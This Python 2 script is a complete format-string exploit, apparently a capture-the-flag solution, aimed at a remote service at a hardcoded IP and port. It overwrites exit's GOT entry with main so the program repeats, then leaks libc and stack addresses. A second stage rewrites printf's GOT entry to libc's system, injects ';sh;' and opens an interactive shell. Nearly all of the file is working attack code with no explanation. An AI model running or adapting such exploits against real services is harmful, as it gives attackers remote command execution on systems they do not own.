#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
import re

#host = "10.211.55.23"
#port = 8888
host = "175.119.158.135"
port = 8909

sock = make_conn(host,port)

exitgot = 0x804a024
readplt = 0x080484a6
putplt = 0x80484e6
popret = 0x0804848d
pop3ret = 0x08048717
printfgot = 0x804a010
printfplt = 0x80484b0
recvuntil(sock,"?")
main = 0x804878c

payload = pack32(exitgot)
payload += pack32(exitgot+1)
payload += pack32(exitgot+2)
payload += pack32(exitgot+3)
prev = 16
for i in range(4):
    payload += fmtchar(prev,(main >> i*8) & 0xff,17+i)
    prev = (main >> i*8) & 0xff

payload = payload.ljust(0x64,"a")
sendline(sock,payload)
data = recvuntil(sock,"==")
data =  data.split("\n")[1][8+0x63:]
seed = unpack32(data[:4])
buf = unpack32(data[4+8:16])
libcptr = unpack32(data[4+4:12])
print hex(seed)
libc = libcptr-0x1b741c
print hex(buf)
ans = raw_input("ans:")
sendline(sock,ans)

recvuntil(sock,"?")
system = libc + 0x3b180 
nogg = 0x8048960
payload = pack32(printfgot)
payload += pack32(printfgot+1)
payload += pack32(printfgot+2)
payload += pack32(printfgot+3)
payload += pack32(exitgot)
payload += pack32(exitgot+1)
prev = 24
for i in range(4):
    payload += fmtchar(prev,(system >> i*8) & 0xff,17+i)
    prev = (system >> i*8) & 0xff
for i in range(2):
    payload += fmtchar(prev,(nogg >> i*8) & 0xff,21+i)
    prev = (nogg >> i*8) & 0xff

payload += ";sh;"
print len(payload)
payload = payload.ljust(0x64,"a")
sendline(sock,payload)
data = recvuntil(sock,"==")
data =  data.split("\n")[1][8+0x63:]
seed = unpack32(data[:4])
print hex(seed)
ans = raw_input("ans:")
sendline(sock,ans)

inter(sock)
